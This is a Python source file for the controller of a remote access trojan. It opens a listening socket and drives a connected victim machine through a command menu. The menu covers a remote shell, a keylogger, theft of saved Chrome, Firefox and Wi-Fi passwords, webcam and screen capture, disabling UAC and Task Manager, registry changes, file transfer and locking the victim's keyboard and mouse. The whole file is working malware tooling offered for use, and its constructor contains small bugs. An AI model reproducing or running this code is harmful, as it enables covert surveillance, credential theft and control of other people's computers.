import random
import socket, os
import pickle

class SERVER:
    def __init__(self, host, port):
        self.host = "ip"
        self.port = 4545
    
    def build_connection(self):
        global client, addr, s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((self.host, self.port))
        s.listen(5)
        print("[*] Waiting for the client...")
        client, addr = s.accept()
        print()
        ipcli = client.recv(1024).decode()
        print(f"[*] Connection is established successfully with {ipcli}")
        print()
    
    def server(self):
        try:
            from vidstream import StreamingServer
            global server
            server = StreamingServer(self.host, 8080)
            server.start_server()
        except:
            print("Module not found...")
    
    def stop_server(self):
        server.stop_server()
    
    def result(self):
        client.send(command.encode())
        result_output = client.recv(1024).decode()
        print(result_output)
    
    
    def banner(self):
        print("======================================================")
        print("                       Commands                       ")
        print("======================================================")
        print("System: ")
        print("======================================================")
        print(f'''
help                      all commands available
writein <text>            write the text to current opened window
browser                   enter quiery to browser
turnoffmon                turn off the monitor
turnonmon                 turn on the monitor
reboot                    reboot the system
drivers                   all drivers of PC
kill                      kill the system task
sendmessage               send messagebox with the text
cpu_cores                 number of CPU cores
systeminfo (extended)     all basic info about system (via cmd)
tasklist                  all system tasks
localtime                 current system time
curpid                    PID of client's process
sysinfo (shrinked)        basic info about system (Powers of Python)
shutdown                  shutdown client's PC
isuseradmin               check if user is admin
extendrights              extend system rights
disabletaskmgr            disable Task Manager
enabletaskmgr             enable Task Manager
disableUAC                disable UAC
monitors                  get all used monitors
geolocate                 get location of computer
volumeup                  increase system volume to 100%
volumedown                decrease system volume to 0%
setvalue                  set value in registry
delkey                    delete key in registry
createkey                 create key in registry
setwallpaper              set wallpaper
exit                      terminate the session of RAT
''')
        print("======================================================")
        print("Shell: ")
        print("======================================================")
        print(f'''
pwd                       get current working directory
shell                     execute commands via cmd
cd                        change directory
[Driver]:                 change current driver
cd ..                     change directory back
dir                       get all files of current directory
abspath                   get absolute path of files
''')
        print("======================================================")
        print("Network: ")
        print("======================================================")
        print(f'''
ipconfig                  local ip
portscan                  port scanner
profiles                  network profiles
profilepswd               password for profile
''')
        print("======================================================")
        print("Input devices: ")
        print("======================================================")
        print(f'''
keyscan_start             start keylogger
send_logs                 send captured keystrokes
stop_keylogger            stop keylogger
disable(--keyboard/--mouse/--all) 
enable(--keyboard/--mouse/--all)
''')
        print("======================================================")
        print("Video: ")
        print("======================================================")
        print(f'''
screenshare               overseing remote PC
webcam                    webcam video capture
breakstream               break webcam/screenshare stream
screenshot                capture screenshot
webcam_snap               capture webcam photo
''')
        print("======================================================")
        print("Files:")
        print("======================================================")
        print(f'''
delfile <file>            delete file
editfile <file> <text>    edit file
createfile <file>         create file
download <file> <homedir> download file
upload                    upload file
cp <file1> <file2>        copy file
mv <file> <path>          move file
searchfile <file> <dir>   search for file in mentioned directory
mkdir <dirname>           make directory
rmdir <dirname>           remove directory
startfile <file>          start file
readfile <file>           read from file
        ''')
        print("======================================================")
        print("Web Browser: ")
        print("======================================================")
        print(f'''
get_passwords_firefox            =-get saved passwords in firefox
get_passwords_chrome             get saved passwords in chrome
''')
        print("======================================================")
    
    def execute(self):
        self.banner()
        while True:
            global command
            command = input('Command >>  ')

            if command == 'shell':
                exit = False
                client.send(command.encode())
                while not exit:
                    command = str(input('>> '))
                    client.send(command.encode())
                    if command.lower() == 'exit':
                        exit = True
                    result_shell = client.recv(1024).decode()
                    print(result_shell)
            
            elif command == 'drivers':
                client.send(command.encode())
                result_drivers = client.recv(1024).decode()
                print(result_drivers)
            
            elif command == 'setvalue':
                client.send(command.encode())
                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                root = str(input('Enter the path to store key [ex. SOFTWARE\\test]: '))
                key = str(input('Enter the key name: '))
                value = str(input('Enter the value of key [None, 0, 1, 2 etc.]: '))
                client.send(const.encode())
                client.send(root.encode())
                client.send(key.encode())
                client.send(value.encode())
                result_setvalue = client.recv(1024).decode()
                print(result_setvalue)
            
            elif command == 'delkey':
                client.send(command.encode())
                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                root = str(input('Enter the path to key: '))
                client.send(const.encode())
                client.send(root.encode())
                result_delkey = client.recv(1024).decode()
                print(result_delkey)
            
            elif command == 'createkey':
                client.send(command.encode())
                const = str(input("Enter the HKEY_* constant [HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, HKEY_CURRENT_CONFIG]: "))
                root = str(input('Enter the path to key: '))
                client.send(const.encode())
                client.send(root.encode())
                result_createkey = client.recv(1024).decode()
                print(result_createkey)
            
            elif command == 'disableUAC':
                client.send(command.encode())
                result_disableUAC = client.recv(1024).decode()
                print(result_disableUAC)
            elif command == 'shutdown':
                client.send(command.encode())
                client.recv(1024).decode()

            elif command == 'reboot':
                client.send(command.encode())
                result_reboot = client.recv(1024).decode()
                print(result_reboot)
            
            elif command == 'usbdrivers':
                client.send(command.encode())
                result_usbdrivers = client.recv(1024).decode()
                print(result_usbdrivers)
            
            elif command == 'volumeup':
                client.send(command.encode())
                result_volup = client.recv(1024).decode()
                print(result_volup)
            
            elif command == 'volumedown':
                client.send(command.encode())
                result_voldown = client.recv(1024).decode()
                print(result_voldown)
            
            elif command == 'monitors':
                client.send(command.encode())
                result_monitors = client.recv(1024).decode()
                print(result_monitors)
            
            elif command[:4] == 'kill':
                if not command[5:]:
                    print("No process mentioned to terminate")
                else:
                    client.send(command.encode())
                    result_kill = client.recv(1024).decode()
                    print(result_kill)
            
            elif command == 'extendrights':
                client.send(command.encode())
                result_extendrights = client.recv(1024).decode()
                print(result_extendrights)
            
            elif command == 'geolocate':
                client.send(command.encode())
                result_geolocate = client.recv(1024).decode()
                print(result_geolocate)
            
            elif command == 'turnoffmon':
                client.send(command.encode())
                result_turnoffmon = client.recv(1024).decode()
                print(result_turnoffmon)
            
            elif command == 'turnonmon':
                client.send(command.encode())
                result_turnonmon = client.recv(1024).decode()
                print(result_turnonmon)
            
            elif command == 'setwallpaper':
                client.send(command.encode())
                text = str(input("Enter the filepath: "))
                client.send(text.encode())
                result_setwallpaper = client.recv(1024).decode()
                print(result_setwallpaper)
            
            elif command == 'keyscan_start':
                client.send(command.encode())
                result_keyscan = client.recv(1024).decode()
                print(result_keyscan)

            elif command == 'get_passwords_chrome':
                client.send(command.encode())
                req_passwords = client.recv(1024)
                result_decode = pickle.loads(req_passwords)
                print(result_decode)
                

            elif command == 'get_passwords_firefox':
                client.send(command.encode())
                result_req = client.recv(1024).decode()
                print(result_req)
                firefox_profile = str(input("Select Profile  >> "))
                client.send(firefox_profile.encode())
                try:
                    result_dec = client.recv(1024)
                    decode = pickle.loads(result_dec)
                    print(decode)
                except Exception as e:
                    print("Error:", e)

            elif command == 'send_logs':
                client.send(command.encode())
                result_logs = client.recv(1024).decode()
                print(result_logs)
            
            elif command == 'stop_keylogger':
                client.send(command.encode())
                result_stopkeylogger = client.recv(1024).decode()
                print(result_stopkeylogger)
            
            elif command[:7] == 'delfile':
                if not command[8:]:
                    print("No file to delete")
                else:
                    client.send(command.encode())
                    result_delfile = client.recv(1024).decode()
                    print(result_delfile)
            
            elif command[:10] == 'createfile':
                if not command[11:]:
                    print("No file to create")
                else:
                    client.send(command.encode())
                    result_createfile = client.recv(1024).decode()
                    print(result_createfile)
            
            elif command == 'tasklist':
                client.send(command.encode())
                result_tasklist = client.recv(1024).decode()
                print(result_tasklist)
            
            elif command == 'ipconfig':
                client.send(command.encode())
                result_ipconfig = client.recv(1024).decode()
                print(result_ipconfig)
            
            elif command[:7] == 'writein':
                if not command[8:]:
                    print("No text to output")
                else:
                    client.send(command.encode())
                    result_writein = client.recv(1024).decode()
                    print(result_writein)
            
            elif command == 'sendmessage':
                client.send(command.encode())
                text_message = str(input("Enter the text: "))
                client.send(text_message.encode())
                title_message = str(input("Enter the title: "))
                client.send(title_message.encode())
                result_message = client.recv(1024).decode()
                print(result_message)
            
            elif command == 'profilepswd':
                client.send(command.encode())
                profile = str(input("Enter the profile name: "))
                client.send(profile.encode())
                result_profilepaswd = client.recv(2147483647).decode()
                print(result_profilepaswd)
            
            elif command == 'profiles':
                client.send(command.encode())
                result_profiles = client.recv(1024).decode()
                print(result_profiles)

            elif command == 'cpu_cores':
                client.send(command.encode())
                result_cpu = client.recv(1024).decode()
                print(result_cpu)
            
            elif command[:2] == 'cd':
                if not command[3:]: 
                    print("No directory")
                else:
                    client.send(command.encode())
                    result_cd = client.recv(1024).decode()
                    print(result_cd)
            
            elif command == 'cd ..':
                client.send(command.encode())
                result_cdback = client.recv(1024).decode()
                print(result_cdback)
            
            elif command[1:2] == ':':
                client.send(command.encode())
                result_command = client.recv(1024).decode()
                print(result_command)
            
            elif command == 'dir':
                client.send(command.encode())
                result_dir = client.recv(20000000).decode()
                print(result_dir)
            
            elif command == 'portscan':
                client.send(command.encode())
                result_portscan = client.recv(30000).decode()
                print(result_portscan)
            
            elif command == 'systeminfo':
                client.send(command.encode())
                result_systeminfo = client.recv(1024).decode()
                print(result_systeminfo)
            
            elif command == 'localtime':
                client.send(command.encode())
                result_localtime = client.recv(1024).decode()
                print(result_localtime)
            
            elif command[:7] == 'abspath':
                if not command[8:]:
                    print("No file")
                else:
                    client.send(command.encode())
                    result_abspath = client.recv(1024).decode()
                    print(result_abspath)
            
            elif command[:8] == 'readfile':
                if not command[9:]:
                    print("No file to read")
                else:
                    client.send(command.encode())
                    result_readfile = client.recv(2147483647).decode()
                    print("===================================================")
                    print(result_readfile)
                    print("===================================================")
            
            elif command.startswith("disable") and command.endswith("--keyboard"):
                client.send(command.encode())
                result_disablekeyboard = client.recv(1024).decode()
                print(result_disablekeyboard)
            
            elif command.startswith("disable") and command.endswith("--mouse"):
                client.send(command.encode())
                result_disablemouse = client.recv(1024).decode()
                print(result_disablemouse)
            
            elif command.startswith("disable") and command.endswith("--all"):
                client.send(command.encode())
                result_disableall = client.recv(1024).decode()
                print(result_disableall)
            
            elif command.startswith("enable") and command.endswith("--all"):
                client.send(command.encode())
                result_enableall = client.recv(1024).decode()
                print(result_enableall)
            
            elif command.startswith("enable") and command.endswith("--keyboard"):
                client.send(command.encode())
                result_enablekeyboard = client.recv(1024).decode()
                print(result_enablekeyboard)
            
            elif command.startswith("enable") and command.endswith("--mouse"):
                client.send(command.encode())
                result_enablemouse = client.recv(1024).decode()
                print(result_enablemouse)
            
            elif command[:7] == 'browser':
                client.send(command.encode())
                quiery = str(input("Enter the quiery: "))
                client.send(quiery.encode())
                result_browser = client.recv(1024).decode()
                print(result_browser)
            
            elif command[:2] == 'cp':
                client.send(command.encode())
                result_cp = client.recv(1024).decode()
                print(result_cp)
            
            elif command[:2] == 'mv':
                client.send(command.encode())
                result_mv = client.recv(1024).decode()
                print(result_mv)
            
            elif command[:8] == 'editfile':
                client.send(command.encode())
                result_editfile = client.recv(1024).decode()
                print(result_editfile)
            
            elif command[:5] == 'mkdir':
                if not command[6:]:
                    print("No directory name")
                else:
                    client.send(command.encode())
                    result_mkdir = client.recv(1024).decode()
                    print(result_mkdir)
            
            elif command[:5] == 'rmdir':
                if not command[6:]:
                    print("No directory name")
                else:
                    client.send(command.encode())
                    result_rmdir = client.recv(1024).decode()
                    print(result_rmdir)
            
            elif command[:10] == 'searchfile':
                client.send(command.encode())
                result_search = client.recv(1024).decode()
                print(result_search)
            
            elif command == 'curpid':
                client.send(command.encode())
                result_curpid = client.recv(1024).decode()
                print(result_curpid)
            
            elif command == 'sysinfo':
                client.send(command.encode())
                result_sysinfo = client.recv(1024).decode()
                print(result_sysinfo)
            
            elif command == 'pwd':
                client.send(command.encode())
                result_pwd = client.recv(1024).decode()
                print(result_pwd)
            
            elif command == 'screenshare':
                client.send(command.encode("utf-8"))
                self.server()
            
            elif command == 'webcam':
                client.send(command.encode("utf-8"))
                self.server()
            
            elif command == 'breakstream':
                self.stop_server()
            
            elif command[:9] == 'startfile':
                if not command[10:]:
                    print("No file to launch")
                else:
                    client.send(command.encode())
                    result_startfile = client.recv(1024).decode()
                    print(result_startfile)

            elif command[:8] == 'download':
                try:
                    client.send(command.encode())
                    file = client.recv(2147483647)
                    with open(f'{command.split(" ")[2]}', 'wb') as f:
                        f.write(file)
                        f.close()
                    print("File is downloaded")
                except: 
                    print("Not enough arguments")

            elif command == 'upload':
                client.send(command.encode())
                file = str(input("Enter the filepath to the file: "))
                filename = str(input("Enter the filepath to outcoming file (with filename and extension): "))
                data = open(file, 'rb')
                filedata = data.read(2147483647)
                client.send(filename.encode())
                print("File has been sent")
                client.send(filedata)
            
            elif command == 'disabletaskmgr':
                self.result()
            
            elif command == 'enabletaskmgr':
                self.result()
            
            elif command == 'isuseradmin':
                self.result()
            
            elif command == 'help':
                self.banner()
            
            elif command == 'screenshot':
                client.send(command.encode())
                file_screenshot = client.recv(2147483647)
                path = f'{os.getcwd()}\\{random.randint(11111,99999)}.png'
                with open(path, 'wb') as f:
                    f.write(file_screenshot)
                    f.close()
                path1 = os.path.abspath(path)
                print(f"File is stored at {path1}")
            
            elif command == 'webcam_snap':
                client.send(command.encode())
                file_webcam = client.recv(2147483647)
                with open(f'{os.getcwd()}\\{random.randint(11111,99999)}.png', 'wb') as f:
                    f.write(file_webcam)
                    f.close()
                print("File is downloaded")

            elif command == 'exit':
                client.send(command.encode())
                break

rat = SERVER('127.0.0.1', 4444)

if __name__ == '__main__':
    rat.build_connection()
    rat.execute()